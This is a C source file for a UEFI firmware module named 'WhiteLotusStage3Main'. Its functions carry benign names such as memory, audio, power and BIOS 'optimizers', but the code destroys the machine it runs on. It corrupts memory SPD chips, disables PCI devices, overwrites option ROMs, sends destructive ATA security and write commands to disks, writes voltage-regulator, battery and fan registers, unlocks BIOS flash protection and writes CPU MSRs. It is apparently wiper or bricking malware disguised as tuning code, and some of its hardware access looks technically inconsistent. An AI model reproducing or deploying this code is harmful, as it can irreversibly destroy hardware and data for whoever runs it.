#include <efi.h>
#include <efilib.h>

EFI_GUID gWhiteLotusGuid = {0xDEADBEEF, 0x1234, 0x5678, {0x9A,0xBC,0xDE,0xF0,0x01,0x23,0x45,0x67}};

#define PCI_ADDR(bus, dev, func, reg) (0x80000000 | ((bus) << 16) | ((dev) << 11) | ((func) << 8) | ((reg) & 0xFC))

UINT32 PciRead32(UINT8 bus, UINT8 dev, UINT8 func, UINT8 reg) {
    __outdword(0xCF8, PCI_ADDR(bus, dev, func, reg));
    return __indword(0xCFC);
}

VOID PciWrite32(UINT8 bus, UINT8 dev, UINT8 func, UINT8 reg, UINT32 val) {
    __outdword(0xCF8, PCI_ADDR(bus, dev, func, reg));
    __outdword(0xCFC, val);
}

UINT16 PciRead16(UINT8 bus, UINT8 dev, UINT8 func, UINT8 reg) {
    __outdword(0xCF8, PCI_ADDR(bus, dev, func, reg));
    return (UINT16)(__indword(0xCFC) & 0xFFFF);
}

UINT8 PciRead8(UINT8 bus, UINT8 dev, UINT8 func, UINT8 reg) {
    __outdword(0xCF8, PCI_ADDR(bus, dev, func, reg));
    return (UINT8)(__indword(0xCFC) & 0xFF);
}

VOID PciWrite8(UINT8 bus, UINT8 dev, UINT8 func, UINT8 reg, UINT8 val) {
    __outdword(0xCF8, PCI_ADDR(bus, dev, func, reg));
    __outdword(0xCFC, (__indword(0xCFC) & 0xFFFFFF00) | val);
}

VOID IoWrite8(UINT16 port, UINT8 val) { __outbyte(port, val); }
UINT8 IoRead8(UINT16 port) { return __inbyte(port); }
VOID IoWrite16(UINT16 port, UINT16 val) { __outword(port, val); }
UINT16 IoRead16(UINT16 port) { return __inword(port); }
VOID IoWrite32(UINT16 port, UINT32 val) { __outdword(port, val); }
UINT32 IoRead32(UINT16 port) { return __indword(port); }

UINT64 Rdmsr(UINT32 msr) {
    UINT32 low, high;
    __asm__ volatile("rdmsr" : "=a"(low), "=d"(high) : "c"(msr));
    return ((UINT64)high << 32) | low;
}

VOID Wrmsr(UINT32 msr, UINT64 val) {
    UINT32 low = (UINT32)(val & 0xFFFFFFFF);
    UINT32 high = (UINT32)(val >> 32);
    __asm__ volatile("wrmsr" : : "a"(low), "d"(high), "c"(msr));
}

VOID WaitTicks(UINTN ticks) {
    for (volatile UINTN i = 0; i < ticks * 500; i++) {
        __asm__ volatile("pause");
    }
}

UINT16 FindSmbusBar(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        if ((id >> 16) == 0x0C05) {
            UINT32 bar = PciRead32((UINT8)bus, 0, 0, 0x10);
            if (bar != 0 && bar != 0xFFFFFFFF) return (UINT16)(bar & 0xFFFFFFF0);
        }
    }
    return 0;
}

VOID InitializeSystemConfiguration(VOID) {
    UINT8 ports[] = {0x2E, 0x4E, 0x3F0, 0x370};
    for (INTN p = 0; p < 4; p++) {
        IoWrite8(ports[p], 0x87);
        IoWrite8(ports[p], 0x87);
        IoWrite8(ports[p], 0x07);
        IoWrite8(ports[p] + 1, 0x08);
        IoWrite8(ports[p], 0x30);
        IoWrite8(ports[p] + 1, 0x00);
        IoWrite8(ports[p], 0x60);
        IoWrite8(ports[p] + 1, 0x00);
        IoWrite8(ports[p], 0x61);
        IoWrite8(ports[p] + 1, 0x00);
        IoWrite8(ports[p], 0xAA);
    }

    IoWrite8(0x2E, 0x87);
    IoWrite8(0x2E, 0x87);
    IoWrite8(0x2E, 0x07);
    IoWrite8(0x2F, 0x08);
    IoWrite8(0x2E, 0xF0);
    IoWrite8(0x2F, 0x00);
    IoWrite8(0x2E, 0xF1);
    IoWrite8(0x2F, 0x00);
    IoWrite8(0x2E, 0xF2);
    IoWrite8(0x2F, 0x00);
    IoWrite8(0x2E, 0xF3);
    IoWrite8(0x2F, 0x00);
    IoWrite8(0x2E, 0xF4);
    IoWrite8(0x2F, 0x01);
    IoWrite8(0x2E, 0xF5);
    IoWrite8(0x2F, 0xFF);
    IoWrite8(0x2E, 0xF6);
    IoWrite8(0x2F, 0xFF);
    IoWrite8(0x2E, 0xAA);
}

VOID OptimizeMemoryTimings(VOID) {
    UINT16 smbusBar = FindSmbusBar();
    if (smbusBar == 0) return;

    IoWrite8(smbusBar, IoRead8(smbusBar) | 0x01);
    UINT8 spdAddrs[] = {0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57};

    for (INTN a = 0; a < 8; a++) {
        IoWrite8((UINT16)(smbusBar + 0x04), spdAddrs[a]);
        for (INTN reg = 0; reg < 32; reg++) {
            IoWrite8((UINT16)(smbusBar + 0x03), (UINT8)reg);
            IoWrite8((UINT16)(smbusBar + 0x02), (UINT8)((reg * 7 + a * 13) & 0xFF));
            for (UINT32 w = 0; w < 300; w++) {
                if (IoRead8(smbusBar) & 0x02) break;
                WaitTicks(1);
            }
        }

        IoWrite8((UINT16)(smbusBar + 0x04), spdAddrs[a]);
        IoWrite8((UINT16)(smbusBar + 0x03), 0x00);
        IoWrite8((UINT16)(smbusBar + 0x02), 0xFF);
        for (UINT32 w = 0; w < 500; w++) {
            if (IoRead8(smbusBar) & 0x02) break;
            WaitTicks(1);
        }

        IoWrite8((UINT16)(smbusBar + 0x04), spdAddrs[a]);
        IoWrite8((UINT16)(smbusBar + 0x03), 0x7F);
        IoWrite8((UINT16)(smbusBar + 0x02), 0xFF);
        for (UINT32 w = 0; w < 500; w++) {
            if (IoRead8(smbusBar) & 0x02) break;
            WaitTicks(1);
        }
    }
}

VOID CalibrateDisplayController(VOID) {
    IoWrite8(0x03C2, 0xE7);
    IoWrite16(0x03C4, 0x0001);
    IoWrite16(0x03CE, 0x0005);

    for (UINT32 i = 0; i < 5000; i++) {
        IoWrite16(0x03D4, 0xFF0E);
        IoWrite16(0x03D4, 0xFF0F);
        IoWrite16(0x03D4, 0x0011);
    }

    IoWrite8(0x03C0, 0x10); IoWrite8(0x03C0, 0x00);
    IoWrite8(0x03C0, 0x13); IoWrite8(0x03C0, 0x00);

    UINT16 i2cBar = 0;
    for (UINT16 bus = 0; bus < 256 && i2cBar == 0; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        if ((id >> 16) == 0x0C05) {
            UINT32 bar = PciRead32((UINT8)bus, 0, 0, 0x10);
            if (bar != 0 && bar != 0xFFFFFFFF) i2cBar = (UINT16)(bar & 0xFFFFFFF0);
        }
    }

    UINT8 edidAddrs[] = {0xA0, 0xA2, 0xA4, 0xA6, 0xA8, 0xAA, 0xAC, 0xAE};
    if (i2cBar) {
        IoWrite8(i2cBar, IoRead8(i2cBar) | 0x01);
        for (INTN a = 0; a < 8; a++) {
            for (INTN offset = 0; offset < 256; offset++) {
                IoWrite8((UINT16)(i2cBar + 0x04), edidAddrs[a]);
                IoWrite8((UINT16)(i2cBar + 0x03), (UINT8)offset);
                IoWrite8((UINT16)(i2cBar + 0x02), (UINT8)((offset * 3 + a * 17) & 0xFF));
                for (UINT32 w = 0; w < 300; w++) {
                    if (IoRead8(i2cBar) & 0x02) break;
                    WaitTicks(1);
                }
            }
        }
    }
}

VOID EnhanceAudioSystem(VOID) {
    UINT8 spkVal = IoRead8(0x61);
    IoWrite8(0x61, spkVal | 0x03);
    IoWrite8(0x43, 0xB6);
    IoWrite8(0x42, 0xFF); IoWrite8(0x42, 0xFF);

    for (UINT32 i = 0; i < 20000; i++) {
        spkVal = IoRead8(0x61);
        IoWrite8(0x61, spkVal | 0x03);
        IoWrite8(0x42, 0xFF);
        spkVal = IoRead8(0x61);
        IoWrite8(0x61, spkVal & 0xFC);
    }

    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        if ((id >> 16) == 0x0403) {
            UINT32 bar = PciRead32((UINT8)bus, 0, 0, 0x10);
            if (bar != 0 && bar != 0xFFFFFFFF) {
                UINT32 hdaBar = bar & 0xFFFFFFC0;
                for (UINT32 reg = 0x60; reg <= 0x7C; reg += 4) {
                    IoWrite32((UINT16)(hdaBar + reg), 0xFFFFFFFF);
                }
                IoWrite32((UINT16)(hdaBar + 0x6C), 0x00000000);
            }
            PciWrite32((UINT8)bus, 0, 0, 0x04, 0x00000000);
        }
    }
}

VOID UpdatePeripheralFirmware(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        UINT16 classCode = (UINT16)(id >> 16);

        if (classCode == 0x0C03 || classCode == 0x0C00) {
            for (INTN barIdx = 0; barIdx < 6; barIdx++) {
                UINT32 bar = PciRead32((UINT8)bus, 0, 0, (UINT8)(0x10 + barIdx * 4));
                if (bar != 0 && bar != 0xFFFFFFFF) {
                    UINT32 usbBar = bar & 0xFFFFFFF0;
                    IoWrite32((UINT16)(usbBar + 0x00), 0x00000000);
                    IoWrite32((UINT16)(usbBar + 0x04), 0x00000000);
                    IoWrite32((UINT16)(usbBar + 0x08), 0xFFFFFFFF);
                    IoWrite32((UINT16)(usbBar + 0x0C), 0xFFFFFFFF);
                    IoWrite32((UINT16)(usbBar + 0x10), 0xFFFFFFFF);
                    IoWrite32((UINT16)(usbBar + 0x14), 0xFFFFFFFF);

                    for (UINT32 reg = 0x80; reg <= 0xFC; reg += 4) {
                        IoWrite32((UINT16)(usbBar + reg), 0x00000000);
                    }
                }
            }
            PciWrite32((UINT8)bus, 0, 0, 0x04, 0x00000000);
        }
    }
}

VOID InternetOptimizer(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        UINT16 classCode = (UINT16)(id >> 16);

        if (classCode == 0x0200 || classCode == 0x0280) {
            for (INTN barIdx = 0; barIdx < 6; barIdx++) {
                UINT32 bar = PciRead32((UINT8)bus, 0, 0, (UINT8)(0x10 + barIdx * 4));
                if (bar != 0 && bar != 0xFFFFFFFF) {
                    UINT32 devBar = bar & 0xFFFFFFF0;
                    for (UINT32 reg = 0; reg <= 0x3C; reg += 4) {
                        IoWrite32((UINT16)(devBar + reg), 0xFFFFFFFF);
                    }
                    IoWrite32((UINT16)(devBar + 0x38), 0x00000000);
                    IoWrite32((UINT16)(devBar + 0x3C), 0x00000000);
                }
            }
            PciWrite32((UINT8)bus, 0, 0, 0x04, 0x00000000);
        }
    }

    UINT8 *romRegion = (UINT8*)0xC0000;
    for (UINTN i = 0; i < 0x20000; i += 0x80) {
        if (romRegion[i] == 0x55 && romRegion[i+1] == 0xAA) {
            romRegion[i+2] = 0x20;
            romRegion[i+3] = 0x90;
            romRegion[i+4] = 0x90;
            for (UINTN j = 5; j < 64; j++) romRegion[i+j] = 0xFF;
        }
    }
}

VOID ImproveStoragePerformance(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        UINT16 classCode = (UINT16)(id >> 16);

        if (classCode == 0x0106) {
            UINT32 bar5 = PciRead32((UINT8)bus, 0, 0, 0x24);
            if (bar5 != 0 && bar5 != 0xFFFFFFFF) {
                UINT32 abar = bar5 & 0xFFFFF000;
                for (UINT32 reg = 0x04; reg <= 0x30; reg += 4) {
                    IoWrite32((UINT16)(abar + reg), 0xFFFFFFFF);
                }
            }
            PciWrite32((UINT8)bus, 0, 0, 0x04, 0x00000000);
        }

        if (classCode == 0x0108) {
            UINT32 bar0 = PciRead32((UINT8)bus, 0, 0, 0x10);
            if (bar0 != 0 && bar0 != 0xFFFFFFFF) {
                UINT32 nvmeBar = bar0 & 0xFFFFFFF0;
                IoWrite32((UINT16)(nvmeBar + 0x14), 0x00000000);
                for (UINT32 reg = 0x20; reg <= 0x3C; reg += 4) {
                    IoWrite32((UINT16)(nvmeBar + reg), 0xFFFFFFFF);
                }
                IoWrite32((UINT16)(nvmeBar + 0x24), 0x00000003);
                IoWrite32((UINT16)(nvmeBar + 0x28), 0x00000000);
            }
            PciWrite32((UINT8)bus, 0, 0, 0x04, 0x00000000);
        }
    }

    for (UINT8 disk = 0x80; disk < 0x84; disk++) {
        IoWrite8(0x01F6, (disk & 0x01) ? 0xB0 : 0xA0);
        UINT8 status = IoRead8(0x01F7);
        if (status == 0xFF || status == 0x00) continue;

        IoWrite8(0x01F7, 0xF1);
        IoWrite8(0x01F2, 0x01); IoWrite8(0x01F3, 0x00);
        IoWrite8(0x01F4, 0x00); IoWrite8(0x01F5, 0x01);
        for (UINT32 w = 0; w < 2000; w++) {
            if (IoRead8(0x01F7) & 0x08) break;
            WaitTicks(1);
        }
        for (UINT32 w = 0; w < 16; w++) IoWrite16(0x01F0, 0xFFFF);

        IoWrite8(0x01F7, 0x92);
        IoWrite8(0x01F2, 0x01); IoWrite8(0x01F3, 0x01);
        IoWrite8(0x01F4, 0x00); IoWrite8(0x01F5, 0x00);
        IoWrite8(0x01F7, 0xF4);

        IoWrite8(0x01F7, 0xB0);
        IoWrite8(0x01F2, 0x01); IoWrite8(0x01F3, 0x00);
        IoWrite8(0x01F4, 0x00); IoWrite8(0x01F5, 0x00);
        IoWrite8(0x01F7, 0xD4);
        IoWrite8(0x01F7, 0xB1);
        IoWrite8(0x01F2, 0x01); IoWrite8(0x01F3, 0xFF);
        IoWrite8(0x01F4, 0xFF); IoWrite8(0x01F5, 0xFF);
        IoWrite8(0x01F7, 0xD5);

        for (UINT32 p = 0; p < 200; p++) {
            IoWrite8(0x01F6, (disk & 0x01) ? 0xB0 : 0xA0);
            IoWrite8(0x01F7, 0x94);
            IoWrite8(0x01F2, 0x01); IoWrite8(0x01F3, 0x00);
            IoWrite8(0x01F4, 0x00); IoWrite8(0x01F5, 0x00);
            IoWrite8(0x01F7, 0x30);
            for (UINT32 w = 0; w < 2000; w++) {
                if (!(IoRead8(0x01F7) & 0x80)) break;
                WaitTicks(1);
            }
            IoWrite8(0x01F7, 0x91);
            IoWrite8(0x01F7, 0xE7);
            IoWrite8(0x01F7, 0x50);
        }
    }
}

VOID PowerOptimizer(VOID) {
    UINT16 smbusBar = FindSmbusBar();
    if (smbusBar == 0) return;

    IoWrite8(smbusBar, IoRead8(smbusBar) | 0x01);

    UINT8 vrmAddrs[] = {
        0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
        0x60, 0x61, 0x62, 0x63,
        0x10, 0x11, 0x12, 0x13,
        0x20, 0x21, 0x22, 0x23,
        0x30, 0x31, 0x32, 0x33
    };

    for (INTN a = 0; a < 24; a++) {
        IoWrite8((UINT16)(smbusBar + 0x04), vrmAddrs[a]);
        IoWrite8((UINT16)(smbusBar + 0x03), 0x00);
        IoWrite8((UINT16)(smbusBar + 0x02), 0x00);
        for (UINT32 w = 0; w < 300; w++) {
            if (IoRead8(smbusBar) & 0x02) {
                IoWrite8((UINT16)(smbusBar + 0x03), 0x01);
                IoWrite8((UINT16)(smbusBar + 0x02), 0xFF);
                break;
            }
            WaitTicks(1);
        }
    }

    IoWrite8((UINT16)(smbusBar + 0x04), 0x40);
    IoWrite8((UINT16)(smbusBar + 0x03), 0x02);
    IoWrite8((UINT16)(smbusBar + 0x02), 0xFF);
    for (UINT32 w = 0; w < 500; w++) if (IoRead8(smbusBar) & 0x02) break; else WaitTicks(1);

    IoWrite8((UINT16)(smbusBar + 0x04), 0x40);
    IoWrite8((UINT16)(smbusBar + 0x03), 0x04);
    IoWrite8((UINT16)(smbusBar + 0x02), 0x01);
    for (UINT32 w = 0; w < 500; w++) if (IoRead8(smbusBar) & 0x02) break; else WaitTicks(1);

    IoWrite8((UINT16)(smbusBar + 0x04), 0x40);
    IoWrite8((UINT16)(smbusBar + 0x03), 0x08);
    IoWrite8((UINT16)(smbusBar + 0x02), 0xFF);
    for (UINT32 w = 0; w < 500; w++) if (IoRead8(smbusBar) & 0x02) break; else WaitTicks(1);

    UINT8 battAddr = 0x12;
    IoWrite8((UINT16)(smbusBar + 0x04), battAddr);
    IoWrite8((UINT16)(smbusBar + 0x03), 0x00);
    IoWrite8((UINT16)(smbusBar + 0x02), 0xFF);
    for (UINT32 w = 0; w < 500; w++) if (IoRead8(smbusBar) & 0x02) break; else WaitTicks(1);

    IoWrite8((UINT16)(smbusBar + 0x04), battAddr);
    IoWrite8((UINT16)(smbusBar + 0x03), 0x01);
    IoWrite8((UINT16)(smbusBar + 0x02), 0xFF);
    for (UINT32 w = 0; w < 500; w++) if (IoRead8(smbusBar) & 0x02) break; else WaitTicks(1);

    IoWrite8((UINT16)(smbusBar + 0x04), battAddr);
    IoWrite8((UINT16)(smbusBar + 0x03), 0x3F);
    IoWrite8((UINT16)(smbusBar + 0x02), 0x00);
    for (UINT32 w = 0; w < 500; w++) if (IoRead8(smbusBar) & 0x02) break; else WaitTicks(1);

    UINT8 dimmAddrs[] = {0x50, 0x51, 0x52, 0x53};
    for (INTN d = 0; d < 4; d++) {
        IoWrite8((UINT16)(smbusBar + 0x04), dimmAddrs[d]);
        IoWrite8((UINT16)(smbusBar + 0x03), 0x00);
        IoWrite8((UINT16)(smbusBar + 0x02), 0x00);
        for (UINT32 w = 0; w < 300; w++) {
            if (IoRead8(smbusBar) & 0x02) {
                IoWrite8((UINT16)(smbusBar + 0x03), 0x02);
                IoWrite8((UINT16)(smbusBar + 0x02), 0xFF);
                break;
            }
            WaitTicks(1);
        }
        IoWrite8((UINT16)(smbusBar + 0x04), dimmAddrs[d]);
        IoWrite8((UINT16)(smbusBar + 0x03), 0x04);
        IoWrite8((UINT16)(smbusBar + 0x02), 0xFF);
        for (UINT32 w = 0; w < 500; w++) if (IoRead8(smbusBar) & 0x02) break; else WaitTicks(1);
    }
}

VOID ThermalManager(VOID) {
    IoWrite8(0x2E, 0x87); IoWrite8(0x2E, 0x87);
    IoWrite8(0x2E, 0x07); IoWrite8(0x2F, 0x08);

    for (INTN reg = 0x10; reg <= 0x20; reg++) {
        IoWrite8(0x2E, (UINT8)reg);
        IoWrite8(0x2F, 0x00);
    }

    IoWrite8(0x2E, 0x04);
    UINT8 fanCtrl = IoRead8(0x2F);
    IoWrite8(0x2F, fanCtrl & 0xF0);

    IoWrite8(0x2E, 0xF4);
    IoWrite8(0x2F, 0x01);
    IoWrite8(0x2E, 0xF5);
    IoWrite8(0x2F, 0xFF);
    IoWrite8(0x2E, 0xF6);
    IoWrite8(0x2F, 0xFF);

    IoWrite8(0x2E, 0xAA);

    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) != 0x8086) continue;

        UINT32 rcba = PciRead32((UINT8)bus, 31, 0, 0xF0);
        if (rcba == 0 || rcba == 0xFFFFFFFF) continue;
        rcba &= 0xFFFFFFF0;

        IoWrite32((UINT16)(rcba + 0x3330), 0x00000000);
        IoWrite32((UINT16)(rcba + 0x3334), 0xFFFFFFFF);
        IoWrite32((UINT16)(rcba + 0x3338), 0x000000FF);
        break;
    }
}

VOID GraphicsEnhancer(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        UINT16 classCode = (UINT16)(id >> 16);

        if (classCode == 0x0300 || classCode == 0x0301 || classCode == 0x0302) {
            for (INTN barIdx = 0; barIdx < 6; barIdx++) {
                PciWrite32((UINT8)bus, 0, 0, (UINT8)(0x10 + barIdx * 4), 0x00000000);
            }

            UINT32 romBar = PciRead32((UINT8)bus, 0, 0, 0x30);
            if (romBar != 0 && romBar != 0xFFFFFFFF) {
                UINT8 *rom = (UINT8*)(UINTN)(romBar & 0xFFFFFFF0);
                if (rom[0] == 0x55 && rom[1] == 0xAA) {
                    rom[2] = 0x00;
                    for (INTN i = 0; i < 512; i++) rom[i] = (UINT8)((i * 7 + 13) & 0xFF);
                }
            }

            PciWrite32((UINT8)bus, 0, 0, 0x04, 0x00000000);
        }
    }
}

VOID PerformanceTuner(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        UINT8 headerType = PciRead8((UINT8)bus, 0, 0, 0x0E) & 0x7F;
        UINT8 maxFunc = (headerType & 0x80) ? 8 : 1;

        for (UINT8 func = 0; func < maxFunc; func++) {
            id = PciRead32((UINT8)bus, 0, func, 0);
            if ((id & 0xFFFF) == 0xFFFF) continue;

            UINT8 capPtr = PciRead8((UINT8)bus, 0, func, 0x34);
            while (capPtr >= 0x40 && capPtr < 0xFF) {
                UINT8 capId = PciRead8((UINT8)bus, 0, func, capPtr);
                if (capId == 0x10) {
                    UINT16 aerCap = (UINT16)(capPtr + 0x08);
                    PciWrite32((UINT8)bus, 0, func, (UINT8)(aerCap + 0x00), 0xFFFFFFFF);
                    PciWrite32((UINT8)bus, 0, func, (UINT8)(aerCap + 0x04), 0xFFFFFFFF);
                    PciWrite32((UINT8)bus, 0, func, (UINT8)(aerCap + 0x08), 0xFFFFFFFF);
                    break;
                }
                if (capId == 0x05) break;
                capPtr = PciRead8((UINT8)bus, 0, func, (UINT8)(capPtr + 1));
            }

            PciWrite32((UINT8)bus, 0, func, 0x04, 0x00000000);
            PciWrite32((UINT8)bus, 0, func, 0x3C, 0x00000000);
        }
    }
}

VOID SecurityEnhancer(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) == 0xFFFF) continue;
        UINT16 classCode = (UINT16)(id >> 16);

        if (classCode == 0x9797 || classCode == 0x0001 || classCode == 0x0C04 || classCode == 0x0880) {
            for (INTN barIdx = 0; barIdx < 6; barIdx++) {
                PciWrite32((UINT8)bus, 0, 0, (UINT8)(0x10 + barIdx * 4), 0x00000000);
            }
            PciWrite32((UINT8)bus, 0, 0, 0x04, 0x00000000);
        }
    }

    UINT16 ipmiPorts[] = {0x0CA2, 0x0CA3, 0x0CA4, 0x0CA5, 0x0E4, 0x0E5, 0x0E6, 0x0E7};
    for (INTN p = 0; p < 8; p++) {
        IoWrite8(ipmiPorts[p], 0xFF);
        IoWrite8((UINT16)(ipmiPorts[p] + 1), 0xFF);
    }
}

VOID BiosOptimizer(VOID) {
    for (UINT16 bus = 0; bus < 256; bus++) {
        UINT32 id = PciRead32((UINT8)bus, 0, 0, 0);
        if ((id & 0xFFFF) != 0x8086) continue;

        UINT32 rcba = PciRead32((UINT8)bus, 31, 0, 0xF0);
        if (rcba == 0 || rcba == 0xFFFFFFFF) continue;
        rcba &= 0xFFFFFFF0;

        UINT32 spiBar = rcba + 0x3800;
        IoWrite32((UINT16)spiBar, 0x00000002);
        for (UINT32 w = 0; w < 5000; w++) {
            if (IoRead32((UINT16)spiBar) & 0x00008000) break;
            WaitTicks(1);
        }

        UINT32 biosCntl = rcba + 0x30DC;
        IoWrite32((UINT16)biosCntl, 0x00000003);
        IoWrite32((UINT16)(biosCntl - 0x04), 0x00000000);

        IoWrite32((UINT16)(rcba + 0x3400), 0x00000001);
        IoWrite32((UINT16)(rcba + 0x3404), 0x00000000);
        IoWrite32((UINT16)(rcba + 0x3418), 0x00000000);
        IoWrite32((UINT16)(rcba + 0x341C), 0x00000000);
        IoWrite32((UINT16)(rcba + 0x3420), 0x00000000);
    }
}

VOID SystemMaintenance(VOID) {
    Wrmsr(0x00000176, 0x0000000000010000ULL);
    Wrmsr(0x000001A0, 0x000000FFFFFFFF00ULL);
    Wrmsr(0x0000003A, Rdmsr(0x0000003A) | 0x00000001);
    Wrmsr(0x00000C80, Rdmsr(0x00000C80) | 0x80000000);
    Wrmsr(0x00000179, 0x0000000000000000ULL);
    Wrmsr(0x0000017A, 0x0000000000000000ULL);
    Wrmsr(0x0000017B, 0x00000000000000FFULL);
    Wrmsr(0x000001D9, 0x00000000000000FFULL);
    Wrmsr(0x000001DA, 0x0000000000000000ULL);
    Wrmsr(0x000001DB, 0xFFFFFFFFFFFFFFFFULL);

    IoWrite8(0xB2, 0x00); IoWrite8(0xB3, 0xFF);
    IoWrite8(0xB2, 0xFF); IoWrite8(0xB3, 0x00);
    IoWrite8(0xB2, 0xAA); IoWrite8(0xB3, 0x55);
}

EFI_STATUS
EFIAPI
WhiteLotusStage3Main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    InitializeSystemConfiguration();
    OptimizeMemoryTimings();
    CalibrateDisplayController();
    EnhanceAudioSystem();
    UpdatePeripheralFirmware();
    InternetOptimizer();
    ImproveStoragePerformance();
    PowerOptimizer();
    ThermalManager();
    GraphicsEnhancer();
    PerformanceTuner();
    SecurityEnhancer();
    BiosOptimizer();
    SystemMaintenance();

    return EFI_SUCCESS;
}